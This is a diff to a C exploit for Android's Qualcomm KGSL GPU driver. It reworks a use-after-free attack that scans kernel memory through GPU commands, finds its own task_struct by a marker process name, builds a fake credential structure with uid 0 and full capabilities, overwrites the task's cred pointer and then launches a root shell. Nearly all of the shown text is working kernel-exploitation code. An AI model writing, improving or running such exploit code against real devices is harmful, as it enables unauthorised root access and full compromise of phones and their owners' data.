@@ -267,6 +267,8 @@ static void *race_thread(void *arg) {
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
 
+    prctl(PR_SET_NAME, "TASKUAF!!");
+
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
@@ -437,10 +439,11 @@ int main(int argc, char **argv) {
     uint64_t task_pages[16];
     uint32_t task_comm_offs[16];
     int n_task = 0;
-    uint32_t task_page_data[SCAN_DWORDS];
     uint64_t cred_pages[32];
     int cred_offs[32];
     int n_cred = 0;
+    uint64_t target_task_page = 0;
+    uint64_t target_cred_ptr = 0;
 
     uint64_t scan_start = UAF_ADDR + 0x300000;
     if (scan_start < UAF_ADDR + 0x2000) scan_start = UAF_ADDR + 0x2000;
@@ -477,28 +480,27 @@ int main(int argc, char **argv) {
                 n_comm++;
             }
         }
+        if (n_comm > 0) {
+            printf("  [TASK_COMM] va=0x%lx nz=%d comm_off=0x%x\n",
+                (unsigned long)va, nz, comm_off);
+            task_pages[n_task] = va;
+            task_comm_offs[n_task] = comm_off;
+            n_task++;
+            if (target_task_page == 0) {
+                target_task_page = va;
+                uint64_t cred_ptr = (uint64_t)data[CRED_OFF/4] | ((uint64_t)data[CRED_OFF/4 + 1] << 32);
+                if (cred_ptr > 0xffffff8000000000ULL && cred_ptr < 0xffffffffffff0000ULL) {
+                    target_cred_ptr = cred_ptr;
+                    printf("  [CRED_PTR] = 0x%lx\n", (unsigned long)cred_ptr);
+                }
+            }
+        }
         int cred_off_found = -1;
         for (int i = 0; i < SCAN_DWORDS - 8; i++) {
             int cnt = 0;
             for (int j = 0; j < 8; j++)
                 if (data[i + j] == 0x000007D0) cnt++;
             if (cnt >= 4) { cred_off_found = i * 4; break; }
-        }
-
-        if (n_comm > 0) {
-            printf("  [TASK_COMM] va=0x%lx nz=%d comm_off=0x%x\n",
-                (unsigned long)va, nz, comm_off);
-            task_comm_offs[n_task] = comm_off;
-            task_pages[n_task++] = va;
-            if (n_task == 1) memcpy(task_page_data, data, SCAN_DWORDS * 4);
-
-            uint64_t cred_ptr = (uint64_t)data[CRED_OFF/4] | ((uint64_t)data[CRED_OFF/4 + 1] << 32);
-            if (cred_ptr > 0xffffff8000000000ULL && cred_ptr < 0xffffffffffff0000ULL) {
-                printf("  [CRED_PTR] va=0x%lx cred=0x%lx\n", (unsigned long)va, (unsigned long)cred_ptr);
-                cred_pages[n_cred] = cred_ptr & ~0xfffULL;
-                cred_offs[n_cred] = cred_ptr & 0xfff;
-                n_cred++;
-            }
         }
         if (cred_off_found >= 0 && n_cred < 32) {
             printf("  [CRED] va=0x%lx nz=%d off=0x%x\n",
@@ -507,241 +509,57 @@ int main(int argc, char **argv) {
             cred_offs[n_cred] = cred_off_found;
             n_cred++;
         }
-        int sec_hits[64]; int n_sec = 0;
-        for (int i = 0; i < SCAN_DWORDS - 6 && n_sec < 64; i++) {
-            if (data[i] == data[i+1] && data[i] == data[i+2] &&
-                data[i] == data[i+3] && data[i] == data[i+4] &&
-                data[i] == data[i+5] && data[i] != 0) {
-                int dup = 0;
-                for (int s = 0; s < n_sec; s++)
-                    if (sec_hits[s] == (int)data[i]) { dup = 1; break; }
-                if (!dup) {
-                    sec_hits[n_sec++] = data[i];
-                    if (data[i] < 10000)
-                        printf("  [SEC_CRED] va=0x%lx sid=%u off=0x%x\n",
-                            (unsigned long)va, data[i], i*4);
-                }
-                i += 6;
-            }
-        }
     }
     printf("[*] Scan complete: found %d task_struct pages, %d cred pages\n", n_task, n_cred);
-
-    uint32_t saved_user_lo = 0, saved_user_hi = 0;
-    uint32_t saved_user_ns_lo = 0, saved_user_ns_hi = 0;
-    uint32_t saved_grp_lo = 0, saved_grp_hi = 0;
-
-    if (n_cred > 0) {
-        printf("[*] Phase 7c: Dumping first cred page for layout verification\n");
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, 0x1000);
-        uint32_t *ccmd = (uint32_t *)ib_m;
-        int cdw = 0;
-        ccmd[cdw++] = cp_type7(CP_NOP, 0);
-        for (int ci = 0; ci < 48; ci++) {
-            uint32_t cdl, cdh, csl, csh;
-            split64(dst_ga + ci * 4, &cdl, &cdh);
-            split64(cred_pages[0] + cred_offs[0] + ci * 4, &csl, &csh);
-            ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            ccmd[cdw++] = 0; ccmd[cdw++] = cdl; ccmd[cdw++] = cdh;
-            ccmd[cdw++] = csl; ccmd[cdw++] = csh;
-        }
-        ccmd[cdw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int cts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, cdw*4, ib_id, &cts) == 0) {
-            wait_timestamp(kgsl_fd, ctx_id, cts);
-            __sync_synchronize();
-            uint32_t *cd = (uint32_t *)dst_m;
-            printf("  cred+0x00:");
-            for (int ci = 0; ci < 48; ci++) {
-                if (ci > 0 && (ci % 8) == 0) printf("\n  cred+0x%02X:", ci*4);
-                printf(" %08X", cd[ci]);
-            }
-            printf("\n");
-            saved_user_lo = cd[32]; saved_user_hi = cd[33];
-            saved_user_ns_lo = cd[34]; saved_user_ns_hi = cd[35];
-            saved_grp_lo = cd[36]; saved_grp_hi = cd[37];
-        }
+    if (target_task_page == 0) {
+        printf("[-] No task_struct with TASKUAF!! found\n");
+        goto cleanup;
     }
 
-    uint64_t inc_sec = 0;
-    {
-        printf("[*] Phase 7e: Testing GPU read from kernel VA (init_cred)\n");
-        memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
-        uint64_t test_vas[] = {
-            init_cred_addr,
-            init_cred_addr + 0x78,
-            0xFFFFFFC000000000ULL,
-            0xFFFFFF8000000000ULL,
-        };
-        uint32_t *tcmd = (uint32_t *)ib_m; int tdw = 0;
-        tcmd[tdw++] = cp_type7(CP_NOP, 0);
-        for (int i = 0; i < 4; i++) {
-            uint32_t dl, dh, sl, sh;
-            split64(dst_ga + i * 8, &dl, &dh);
-            split64(test_vas[i], &sl, &sh);
-            tcmd[tdw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            tcmd[tdw++] = 0; tcmd[tdw++] = dl; tcmd[tdw++] = dh;
-            tcmd[tdw++] = sl; tcmd[tdw++] = sh;
-        }
-        tcmd[tdw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int tts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, tdw*4, ib_id, &tts) == 0) {
-            wait_timestamp(kgsl_fd, ctx_id, tts);
-            __sync_synchronize();
-            uint32_t *td = (uint32_t *)dst_m;
-            for (int i = 0; i < 4; i++) {
-                uint64_t val = (uint64_t)td[i*2] | ((uint64_t)td[i*2+1] << 32);
-                printf("  KVA[%d]=0x%lX => 0x%016lX\n",
-                    i, (unsigned long)test_vas[i], (unsigned long)val);
-                if (i == 1) inc_sec = val;
-            }
-        }
+    printf("[*] Phase 7.5: Allocate fake cred object\n");
+    int fake_cred_id = gpuobj_alloc(kgsl_fd, 0x1000, alloc_flags);
+    void *fake_cred_m = gpuobj_mmap(kgsl_fd, 0x1000, fake_cred_id);
+    uint64_t fake_cred_ga = 0, fake_flags = 0;
+    gpuobj_info(kgsl_fd, fake_cred_id, &fake_cred_ga, &fake_flags);
+    printf("  fake cred gpuaddr=0x%lx\n", (unsigned long)fake_cred_ga);
+
+    memset(fake_cred_m, 0, 0x1000);
+    uint32_t *fc = (uint32_t *)fake_cred_m;
+    fc[0x10/4] = 0; fc[0x14/4] = 0; fc[0x18/4] = 0; fc[0x1c/4] = 0;
+    fc[0x20/4] = 0; fc[0x24/4] = 0; fc[0x28/4] = 0; fc[0x2c/4] = 0;
+    fc[0x30/4] = 0x00000004;
+    fc[0x34/4] = 0xFFFFFFFF; fc[0x38/4] = 0x00000003;
+    fc[0x3c/4] = 0xFFFFFFFF; fc[0x40/4] = 0x00000003;
+    fc[0x44/4] = 0xFFFFFFFF; fc[0x48/4] = 0x00000003;
+    fc[0x4c/4] = 0xFFFFFFFF; fc[0x50/4] = 0x00000003;
+    fc[0x54/4] = 0xFFFFFFFF; fc[0x58/4] = 0x00000003;
+    flush_dc_civac_range(fake_cred_m, 0x1000);
+
+    printf("[*] Phase 8: Overwrite task_struct->cred pointer\n");
+    uint64_t task_addr = target_task_page + CRED_OFF;
+    uint32_t *cmd = (uint32_t *)ib_m;
+    int dw = 0;
+    memset(ib_m, 0, 0x10000);
+    uint32_t lo, hi;
+    split64(task_addr, &lo, &hi);
+    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
+    cmd[dw++] = lo; cmd[dw++] = hi;
+    split64(fake_cred_ga, &lo, &hi);
+    cmd[dw++] = lo; cmd[dw++] = hi;
+    cmd[dw++] = cp_type7(CP_NOP, 0);
+    __sync_synchronize();
+    unsigned int ts;
+    if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) {
+        printf("[-] Failed to submit cred pointer overwrite\n");
+        goto cleanup;
     }
-
-    printf("[*] Phase 7b: GPU→CPU coherency via DST buffer\n");
-    {
-        uint32_t *cmd = (uint32_t*)ib_m;
-        uint32_t sl, sh;
-        int dw = 0;
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, 0x1000);
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        split64(dst_ga, &sl, &sh);
-        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-        cmd[dw++] = sl; cmd[dw++] = sh;
-        cmd[dw++] = 0xDEADBEEF; cmd[dw++] = 0xCAFEBABE;
-        split64(dst_ga + 8, &sl, &sh);
-        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-        cmd[dw++] = sl; cmd[dw++] = sh;
-        cmd[dw++] = 0x12345678; cmd[dw++] = 0x9ABCDEF0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
-            wait_timestamp(kgsl_fd, ctx_id, ts);
-            __sync_synchronize();
-            uint64_t v0 = *(volatile uint64_t*)dst_m;
-            uint64_t v1 = *(volatile uint64_t*)(dst_m + 8);
-            printf("  DST[0]=0x%016llX DST[1]=0x%016llX coherency=%s\n",
-                (unsigned long long)v0, (unsigned long long)v1,
-                (v0 == 0xCAFEBABEDEADBEEFULL &&
-                 v1 == 0x9ABCDEF012345678ULL) ? "OK **UAF cred write should work**" : 
-                 (v0 == 0 ? "FAIL (DST not written)" : "FAIL (wrong value)"));
-        }
+    if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) {
+        printf("[-] Timestamp wait failed\n");
+        goto cleanup;
     }
+    printf("[+] cred pointer overwritten to fake cred\n");
 
-    if (n_cred > 0) {
-        printf("[*] Phase 8b: Writing uid=0 + full caps to %d cred pages\n", n_cred);
-        int n_ok = 0;
-        for (int p = 0; p < n_cred && p < 32; p++) {
-            uint64_t cbase = cred_pages[p] + cred_offs[p];
-            uint32_t *cmd = (uint32_t *)ib_m;
-            uint32_t zl, zh, dl, dh, sl, sh;
-            int dw;
-
-            memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
-            dw = 0;
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-            for (int ci = 0; ci < 48; ci++) {
-                split64(dst_ga + ci * 4, &dl, &dh);
-                split64(cbase + ci * 4, &sl, &sh);
-                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-                cmd[dw++] = sl; cmd[dw++] = sh;
-            }
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-            __sync_synchronize();
-            unsigned int ts;
-            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
-                wait_timestamp(kgsl_fd, ctx_id, ts);
-            __sync_synchronize();
-            uint32_t *bd = (uint32_t *)dst_m;
-            printf("  cred[%d] BEFORE: security=0x%08X%08X uid=0x%08X\n",
-                p, bd[31], bd[30], bd[4]);
-
-            n_ok++;
-
-            if (inc_sec != 0) {
-                printf("  Using init_cred->security = 0x%lX for cred[%d]\n",
-                    (unsigned long)inc_sec, p);
-                split64(cbase + 0x78, &zl, &zh);
-                cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-                cmd[dw++] = zl; cmd[dw++] = zh;
-                split64(inc_sec, &zl, &zh);
-                cmd[dw++] = zl; cmd[dw++] = zh;
-            }
-
-            memset(ib_m, 0, 0x10000);
-            dw = 0;
-            split64(cbase + 0x10, &zl, &zh);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 19);
-            cmd[dw++] = zl; cmd[dw++] = zh;
-
-            for (int i = 0; i < 8; i++) cmd[dw++] = 0;
-
-            cmd[dw++] = 0x00000004;
-
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-
-            memset(dst_m, 0, 0x1000);
-            split64(dst_ga, &dl, &dh);
-            split64(cbase + 0x10, &sl, &sh);
-            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-            cmd[dw++] = sl; cmd[dw++] = sh;
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-            __sync_synchronize();
-            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
-                wait_timestamp(kgsl_fd, ctx_id, ts);
-            __sync_synchronize();
-            uint32_t uid = *(volatile uint32_t*)dst_m;
-            printf("  CRED[%d]: uid=0x%08X %s\n", p, uid,
-                uid == 0 ? "OK" : "FAIL");
-
-            flush_dc_civac_range((void*)cred_pages[p], 0x1000);
-        }
-        printf("  Phase 8b: %d creds updated\n", n_ok);
-
-        if (n_cred > 0) {
-            printf("[*] Phase 8c: Dumping cred page AFTER write\n");
-            memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
-            uint32_t *ccmd = (uint32_t *)ib_m;
-            int cdw = 0;
-            ccmd[cdw++] = cp_type7(CP_NOP, 0);
-            for (int ci = 0; ci < 48; ci++) {
-                uint32_t dl, dh, sl, sh;
-                split64(dst_ga + ci * 4, &dl, &dh);
-                split64(cred_pages[0] + cred_offs[0] + ci * 4, &sl, &sh);
-                ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                ccmd[cdw++] = 0; ccmd[cdw++] = dl; ccmd[cdw++] = dh;
-                ccmd[cdw++] = sl; ccmd[cdw++] = sh;
-            }
-            ccmd[cdw++] = cp_type7(CP_NOP, 0);
-            __sync_synchronize();
-            unsigned int cts;
-            if (submit_ib(kgsl_fd, ctx_id, ib_ga, cdw*4, ib_id, &cts) == 0) {
-                wait_timestamp(kgsl_fd, ctx_id, cts);
-                __sync_synchronize();
-                uint32_t *cd = (uint32_t *)dst_m;
-                for (int ci = 0; ci < 48; ci++) {
-                    if (ci > 0 && (ci % 8) == 0) printf("\n  cred+0x%02X:", ci*4);
-                    printf(" %08X", cd[ci]);
-                }
-                printf("\n");
-                printf("  AFTER security=0x%08X%08X uid=0x%08X\n",
-                    cd[31], cd[30], cd[4]);
-            }
-        }
-    } else {
-        printf("[-] No cred pages found, cannot write\n");
-    }
+    flush_dc_civac_range((void*)target_task_page, 0x1000);
 
     printf("[*] Phase 8d: Cache eviction\n"); fflush(stdout);
     void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE,
@@ -753,13 +571,14 @@ int main(int argc, char **argv) {
     }
     sleep(1);
 
-    printf("[*] Phase 9: Spawning shell (should be uid=0)\n");
+    printf("[*] Phase 9: Spawning root shell (uid=0)\n");
     printf("  current uid=%u euid=%u\n", getuid(), geteuid());
     fflush(stdout);
 
     execl("/system/bin/sh", "sh", NULL);
     perror("execl failed");
 
+cleanup:
     for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
     while (wait(NULL) > 0);
     printf("[*] Done.\n");
